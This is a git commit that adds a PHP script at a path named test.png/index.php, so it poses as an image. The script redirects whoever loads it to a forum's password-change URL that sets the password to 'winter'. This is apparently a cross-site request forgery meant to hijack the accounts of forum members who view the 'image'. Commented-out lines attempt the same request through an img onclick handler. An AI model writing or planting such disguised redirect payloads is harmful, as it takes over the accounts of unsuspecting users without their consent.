4e10f96e22e84fda7234a485274a2ebe2ae69db9
Sterling Albury <fluxxion@gmail.com>
2022-04-05 12:56:27 -0700

    craziness

---
+++ test.png/index.php
@@ -0,0 +1,11 @@
+<?php 
+// header("Location: http://vulnforum.co.uk/settings&s=http://vulnforum.co.uk/settings/password?password=winter&hash=76887c0378ba2b80f17422fb0c0791c4"); 
+// $image = "http://dev5.4loopdigital.co.za/wp-content/uploads/2015/06/servicesaccomm.jpg";  
+// $width = 960;
+// $height = 300;
+// echo '<img src="url=https://www.bbcode.org/images/lubeck.jpg" height="150" size="150" alt="Johnson Pond" onclick="window.open(http://vulnforum.co.uk/settings/password?password=winter&hash=76887c0378ba2b80f17422fb0c0791c4)"/>';
+
+header("Location: http://vulnforum.co.uk/settings&s=http://vulnforum.co.uk/settings/password?password=winter&hash=76887c0378ba2b80f17422fb0c0791c4");
+
+exit; 
+?>
